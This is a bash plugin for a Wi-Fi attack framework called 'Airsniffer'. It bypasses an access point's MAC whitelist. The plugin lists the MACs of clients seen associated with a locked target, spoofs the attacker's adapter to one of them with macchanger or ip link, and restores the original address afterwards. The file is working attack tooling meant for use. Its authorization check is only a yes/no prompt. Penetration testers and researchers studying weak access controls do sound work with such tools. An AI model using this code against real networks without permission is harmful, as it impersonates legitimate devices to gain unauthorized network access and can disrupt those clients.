#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### Airsniffer plugin: MAC ACL (filter) bypass ######
#
# MAC address filtering is a weak access control. An AP that only admits a
# whitelist of client MACs is bypassed by impersonating a MAC that is already
# permitted - i.e. one of the clients currently associated to it (observed in a
# passive scan). This plugin:
#
#   1) lists candidate allowed MACs for a locked target (via mac_acl_engine.py),
#   2) spoofs the selected interface's MAC to a chosen/typed address,
#   3) restores the original MAC afterwards.
#
# The MAC change is a real adapter modification and impersonates another device,
# so it is gated behind an authorization prompt and a target confirmation. All
# system calls use argument arrays (no shell-string concatenation), and the MAC
# is format-validated before use.
#
# AUTHORIZED USE ONLY.

###### GENERIC PLUGIN VARS ######

plugin_name="MAC ACL bypass"
plugin_description="Spoof the adapter to an already-allowed client MAC to bypass a MAC filter (whitelist)"
plugin_author="Airsniffer"

plugin_enabled=1
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)/airsniffer_ui.sh" 2> /dev/null || true

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### WPA3 MENU REGISTRATION ######

mac_acl_menu_string_id=9130

mac_acl_plugin_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)"
mac_acl_engine="${mac_acl_plugin_dir}/mac_acl_engine.py"

#Session state.
mac_acl_csv=""
mac_acl_spoofed_mac=""
mac_acl_original_mac=""
mac_acl_authorized=0

mac_acl_register_labels() {
	local lang
	local label="MAC ACL bypass (spoof to an allowed client MAC) *"
	for lang in ENGLISH SPANISH FRENCH CATALAN PORTUGUESE RUSSIAN GREEK ITALIAN POLISH GERMAN TURKISH ARABIC CHINESE; do
		arr["${lang}",${mac_acl_menu_string_id}]="${label}"
	done
}
mac_acl_register_labels

plugin_wpa3_menu_option_function="mac_acl_menu"
plugin_wpa3_menu_option_language_string="${mac_acl_menu_string_id}"

###### HELPERS ######

mac_acl_title() {
	as_ui_header "${1}"
}

mac_acl_pause() {
	as_ui_pause
}

mac_acl_python() {
	if command -v python3 > /dev/null 2>&1; then
		echo "python3"
	elif command -v python > /dev/null 2>&1; then
		echo "python"
	else
		echo ""
	fi
}

#Validate a MAC: six colon-separated hex octets.
mac_acl_valid_mac() {
	[[ "${1}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

#One-time authorization gate (spoofing impersonates another device).
mac_acl_authorization_gate() {
	if [ "${mac_acl_authorized}" -eq 1 ]; then
		return 0
	fi
	echo
	echo -e "${red_color}AUTHORIZED TESTING ONLY${normal_color}"
	echo -e "${yellow_color}Spoofing a client's MAC impersonates that device and may disrupt it."
	echo -e "Only do this against a network and clients you are authorized to test.${normal_color}"
	echo
	read -rp "$(echo -e "${green_color}Do you have authorization for this target? [y/N]: ${normal_color}")" _auth
	case "${_auth}" in
		y|Y|yes|YES) mac_acl_authorized=1; return 0 ;;
		*) echo; echo -e "${red_color}Aborted. Authorization is required.${normal_color}"; return 1 ;;
	esac
}

mac_acl_autodetect_csv() {
	local candidate
	candidate="$(ls -t "${tmpdir:-/tmp/}"*.csv 2> /dev/null | head -n1)"
	[ -z "${candidate}" ] && candidate="$(ls -t ./*.csv 2> /dev/null | head -n1)"
	echo "${candidate}"
}

#Read the interface's current MAC via `ip` (fallbacks kept simple).
mac_acl_current_mac() {
	local iface="${1}"
	ip link show "${iface}" 2> /dev/null | awk '/link\/ether/{print $2; exit}'
}

###### SETUP (reuses Airsniffer core) ######

mac_acl_select_interface() {
	select_interface
	mac_acl_pause
}

mac_acl_select_target() {
	if [ -z "${interface}" ]; then
		echo; echo -e "${red_color}No interface selected.${normal_color} Use option 1 first."
		mac_acl_pause; return 1
	fi
	if [ "${ifacemode}" != "Monitor" ]; then
		echo -e "${yellow_color}Enabling monitor mode first...${normal_color}"
		monitor_option "${interface}" || { mac_acl_pause; return 1; }
	fi
	explore_for_targets_option "WPA3"
	[ -n "${bssid}" ] && echo -e "${green_color}Target locked:${normal_color} ${essid:-<hidden>} (${bssid})"
	mac_acl_pause
}

mac_acl_select_csv() {
	local auto
	auto="$(mac_acl_autodetect_csv)"
	echo
	if [ -n "${auto}" ]; then
		echo -e "${blue_color}Most recent scan CSV:${normal_color} ${auto}"
		read -rp "$(echo -e "${green_color}Use it? [Y/n] (or type a path): ${normal_color}")" _answer
		case "${_answer}" in
			""|y|Y|yes|YES) mac_acl_csv="${auto}" ;;
			n|N|no|NO) read -rp "$(echo -e "${green_color}Path to CSV: ${normal_color}")" mac_acl_csv ;;
			*) mac_acl_csv="${_answer}" ;;
		esac
	else
		read -rp "$(echo -e "${green_color}Path to airodump-ng CSV: ${normal_color}")" mac_acl_csv
	fi
	if [ -n "${mac_acl_csv}" ] && [ -f "${mac_acl_csv}" ]; then
		echo -e "${green_color}Selected:${normal_color} ${mac_acl_csv}"
	else
		echo -e "${red_color}File not found.${normal_color}"; mac_acl_csv=""
	fi
	mac_acl_pause
}

###### ACTIONS ######

#List candidate allowed MACs for the locked target.
mac_acl_list_candidates() {
	local py; py="$(mac_acl_python)"
	if [ -z "${py}" ]; then
		echo -e "${red_color}Python 3 not found.${normal_color}"; mac_acl_pause; return
	fi
	if [ ! -f "${mac_acl_engine}" ]; then
		echo -e "${red_color}Engine not found:${normal_color} ${mac_acl_engine}"; mac_acl_pause; return
	fi
	if [ -z "${mac_acl_csv}" ] || [ ! -f "${mac_acl_csv}" ]; then
		echo -e "${red_color}No scan CSV selected.${normal_color} Use the CSV option first."; mac_acl_pause; return
	fi
	if [ -z "${bssid}" ]; then
		echo -e "${red_color}No target locked.${normal_color} Use the target option first."; mac_acl_pause; return
	fi
	echo
	"${py}" "${mac_acl_engine}" "${mac_acl_csv}" --bssid "${bssid}" || \
		echo -e "${red_color}Analyzer failed.${normal_color}"
	mac_acl_pause
}

#Spoof the interface MAC. Prefers macchanger, falls back to `ip link`.
mac_acl_spoof() {
	if [ -z "${interface}" ]; then
		echo -e "${red_color}No interface selected.${normal_color} Use option 1 first."; mac_acl_pause; return
	fi
	if ! mac_acl_authorization_gate; then
		mac_acl_pause; return
	fi

	local newmac
	read -rp "$(echo -e "${green_color}MAC to spoof to (an allowed client, format AA:BB:CC:DD:EE:FF): ${normal_color}")" newmac
	if ! mac_acl_valid_mac "${newmac}"; then
		echo -e "${red_color}Invalid MAC format.${normal_color} Expected six hex octets separated by ':'."
		mac_acl_pause; return
	fi

	#Remember the original MAC once so we can restore it later.
	if [ -z "${mac_acl_original_mac}" ]; then
		mac_acl_original_mac="$(mac_acl_current_mac "${interface}")"
	fi
	echo -e "${blue_color}Original MAC:${normal_color} ${mac_acl_original_mac:-<unknown>}"
	echo -e "${yellow_color}Setting ${interface} MAC to ${newmac}...${normal_color}"

	local ok=1
	if command -v macchanger > /dev/null 2>&1; then
		ip link set dev "${interface}" down 2> /dev/null
		if macchanger --mac="${newmac}" "${interface}" > /dev/null 2>&1; then :; else ok=0; fi
		ip link set dev "${interface}" up 2> /dev/null
	else
		if ip link set dev "${interface}" down 2> /dev/null \
			&& ip link set dev "${interface}" address "${newmac}" 2> /dev/null \
			&& ip link set dev "${interface}" up 2> /dev/null; then :; else ok=0; fi
	fi

	local applied; applied="$(mac_acl_current_mac "${interface}")"
	if [ "${ok}" -eq 1 ] && [ "${applied,,}" = "${newmac,,}" ]; then
		mac_acl_spoofed_mac="${newmac}"
		echo -e "${green_color}MAC spoofed:${normal_color} ${interface} is now ${applied}"
		echo -e "Now (re)associate to the target; the MAC filter should admit this address."
	else
		echo -e "${red_color}MAC change did not apply.${normal_color} Current: ${applied:-<unknown>}"
		echo -e "Some drivers reject arbitrary MACs or need the adapter in managed mode."
	fi
	mac_acl_pause
}

#Restore the original MAC.
mac_acl_restore() {
	if [ -z "${interface}" ]; then
		echo -e "${red_color}No interface selected.${normal_color}"; mac_acl_pause; return
	fi
	if [ -z "${mac_acl_original_mac}" ]; then
		echo -e "${yellow_color}No stored original MAC.${normal_color} Trying hardware (permanent) MAC..."
		if command -v macchanger > /dev/null 2>&1; then
			ip link set dev "${interface}" down 2> /dev/null
			macchanger --permanent "${interface}" > /dev/null 2>&1
			ip link set dev "${interface}" up 2> /dev/null
			echo -e "${green_color}Restored to permanent MAC:${normal_color} $(mac_acl_current_mac "${interface}")"
		else
			echo -e "${red_color}Cannot restore without a stored MAC and macchanger is absent.${normal_color}"
		fi
		mac_acl_pause; return
	fi
	ip link set dev "${interface}" down 2> /dev/null
	ip link set dev "${interface}" address "${mac_acl_original_mac}" 2> /dev/null
	ip link set dev "${interface}" up 2> /dev/null
	echo -e "${green_color}Restored:${normal_color} ${interface} is now $(mac_acl_current_mac "${interface}")"
	mac_acl_spoofed_mac=""
	mac_acl_pause
}

###### SUBMENU ######

mac_acl_menu() {

	while true; do
		clear
		mac_acl_title "MAC ACL bypass - spoof to an allowed client MAC"

		if [ "${ifacemode}" = "Monitor" ]; then
			as_ui_kv "Interface" "${interface:-<none>} [Monitor]" ok
		else
			as_ui_kv "Interface" "${interface:-<none>} [${ifacemode:-Managed}]" warn
		fi
		if [ -n "${bssid}" ]; then
			as_ui_kv "Target AP" "${essid:-<hidden>} (${bssid})" ok
		else
			as_ui_kv "Target AP" "<none - lock a target>" err
		fi
		if [ -n "${mac_acl_spoofed_mac}" ]; then
			as_ui_kv "MAC" "SPOOFED -> ${mac_acl_spoofed_mac} (orig ${mac_acl_original_mac:-?})" err
		else
			as_ui_kv "MAC" "${interface:+$(mac_acl_current_mac "${interface}")}" info
		fi
		as_ui_kv "Scan CSV" "${mac_acl_csv:-<none>}" info
		echo
		as_ui_sep
		as_ui_item 0 "Return to the WPA3 attacks menu"
		as_ui_section "Setup"
		as_ui_item 1 "Select wireless interface"
		as_ui_item 2 "Explore for targets & lock target"
		as_ui_item 3 "Select airodump-ng scan CSV (auto-detect latest)"
		as_ui_section "Bypass"
		as_ui_item 4 "List candidate allowed MACs (from scan)"
		as_ui_item 5 "Spoof interface MAC to an allowed client"
		as_ui_item 6 "Restore original MAC"
		echo

		read -rp "> " mac_option
		case "${mac_option}" in
			0) return ;;
			1) mac_acl_select_interface ;;
			2) mac_acl_select_target ;;
			3) mac_acl_select_csv ;;
			4) mac_acl_list_candidates ;;
			5) mac_acl_spoof ;;
			6) mac_acl_restore ;;
			*) echo -e "${red_color}Invalid option.${normal_color}"; sleep 1 ;;
		esac
	done
}
